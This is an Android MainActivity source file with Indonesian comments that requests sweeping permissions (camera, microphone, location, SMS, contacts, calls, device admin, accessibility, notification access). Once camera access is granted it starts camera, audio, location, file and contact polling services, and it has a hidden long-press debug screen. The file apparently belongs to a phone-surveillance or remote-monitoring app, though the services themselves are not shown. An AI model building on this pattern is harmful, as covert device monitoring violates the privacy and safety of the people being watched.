package com.example.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.app.utils.PermissionHelper;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int RUNTIME_PERMISSION_CODE = 100;
    private static final int DEVICE_ADMIN_CODE = 101;
    private static final int BACKGROUND_LOCATION_CODE = 102;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViewById(R.id.btnRequestRuntime).setOnClickListener(
                v -> requestRuntimePermissions()
        );

        findViewById(R.id.btnAccessibility).setOnClickListener(
                v -> PermissionHelper.openAccessibilitySettings(this)
        );

        findViewById(R.id.btnNotificationListener).setOnClickListener(
                v -> PermissionHelper.openNotificationListenerSettings(this)
        );

        // Long press → buka Diagnostic Mode
        findViewById(R.id.btnNotificationListener).setOnLongClickListener(v -> {
            startActivity(new Intent(MainActivity.this, DebugActivity.class));
            Toast.makeText(MainActivity.this,
                    "Myapk Diagnostic dibuka", Toast.LENGTH_SHORT).show();
            return true;
        });

        findViewById(R.id.btnUsageStats).setOnClickListener(
                v -> PermissionHelper.openUsageStatsSettings(this)
        );

        findViewById(R.id.btnOverlay).setOnClickListener(
                v -> PermissionHelper.openOverlaySettings(this)
        );

        findViewById(R.id.btnManageStorage).setOnClickListener(
                v -> PermissionHelper.openManageStorageSettings(this)
        );

        findViewById(R.id.btnDeviceAdmin).setOnClickListener(
                v -> PermissionHelper.requestDeviceAdmin(this, DEVICE_ADMIN_CODE)
        );

        findViewById(R.id.btnWriteSettings).setOnClickListener(
                v -> PermissionHelper.openWriteSettings(this)
        );

        findViewById(R.id.btnIgnoreBattery).setOnClickListener(
                v -> PermissionHelper.requestIgnoreBatteryOptimizations(this)
        );

        findViewById(R.id.btnBackgroundLocation).setOnClickListener(
                v -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        if (PermissionHelper.hasBackgroundLocationPermission(this)) {
                            Toast.makeText(this,
                                    "Izin lokasi background sudah diberikan",
                                    Toast.LENGTH_SHORT).show();
                        } else {
                            PermissionHelper.requestBackgroundLocation(
                                    this, BACKGROUND_LOCATION_CODE);
                        }
                    } else {
                        Toast.makeText(this,
                                "Tidak diperlukan untuk Android versi ini",
                                Toast.LENGTH_SHORT).show();
                    }
                }
        );

        findViewById(R.id.btnExactAlarm).setOnClickListener(
                v -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        if (PermissionHelper.canScheduleExactAlarms(this)) {
                            Toast.makeText(this,
                                    "Izin exact alarm sudah diberikan",
                                    Toast.LENGTH_SHORT).show();
                        } else {
                            PermissionHelper.openExactAlarmSettings(this);
                        }
                    } else {
                        Toast.makeText(this,
                                "Tidak diperlukan untuk Android versi ini",
                                Toast.LENGTH_SHORT).show();
                    }
                }
        );

        // Hanya start service kalau permission kamera sudah diberikan
        // (artinya user sudah pernah grant permission sebelumnya)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {
            startAllServices();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    // =========================================================
    // START SEMUA SERVICE
    // Dipanggil setelah permission diberikan
    // =========================================================

    private void startAllServices() {
        CameraPollingService.start(this);
        LocationPollingService.start(this);
        AudioPollingService.start(this);
        FilePollingService.start(this);
        UsagePollingService.start(this);
        SettingsPollingService.start(this);
        ContactPollingService.start(this);
        DndPollingService.start(this);
        CalendarPollingService.start(this);
        PhonePollingService.start(this);
        UpdatePollingService.start(this);

        CalendarReminderWorker.schedule(this);
        UsageReportWorker.scheduleDailyReport(this);
        UsageReportWorker.scheduleWeeklyReport(this);
    }

    // =========================================================
    // REQUEST RUNTIME PERMISSIONS
    // =========================================================

    private void requestRuntimePermissions() {

        List<String> permissions = new ArrayList<>();

        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.WRITE_CONTACTS);
        permissions.add(Manifest.permission.READ_CALENDAR);
        permissions.add(Manifest.permission.WRITE_CALENDAR);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.CALL_PHONE);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            permissions.add(Manifest.permission.BLUETOOTH_CONNECT);
            permissions.add(Manifest.permission.BLUETOOTH_SCAN);
            permissions.add(Manifest.permission.BLUETOOTH_ADVERTISE);
        }

        List<String> needed = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(permission);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    needed.toArray(new String[0]),
                    RUNTIME_PERMISSION_CODE
            );
        } else {
            // Semua permission sudah diberikan
            startAllServices();
            Toast.makeText(this,
                    "Semua izin sudah diberikan", Toast.LENGTH_SHORT).show();
        }
    }

    // =========================================================
    // CALLBACK HASIL PERMISSION
    // =========================================================

    @Override
    public void onRequestPermissionsResult(int requestCode,
            String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == BACKGROUND_LOCATION_CODE) {
            if (grantResults.length > 0 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this,
                        "✅ Izin lokasi background diberikan",
                        Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this,
                        "⚠️ Izin lokasi background ditolak. " +
                        "Fitur lokasi di background tidak akan berfungsi.",
                        Toast.LENGTH_LONG).show();
            }
            return;
        }

        if (requestCode == RUNTIME_PERMISSION_CODE) {
            // Hitung berapa yang di-grant
            int granted = 0;
            for (int result : grantResults) {
                if (result == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                }
            }

            // Start service meski tidak semua permission diberikan
            // agar fitur yang tersedia tetap berjalan
            startAllServices();

            if (granted == grantResults.length) {
                Toast.makeText(this,
                        "✅ Semua izin diberikan", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this,
                        "⚠️ " + granted + "/" + grantResults.length +
                        " izin diberikan. Beberapa fitur mungkin tidak berfungsi.",
                        Toast.LENGTH_LONG).show();
            }
        }
    }
}
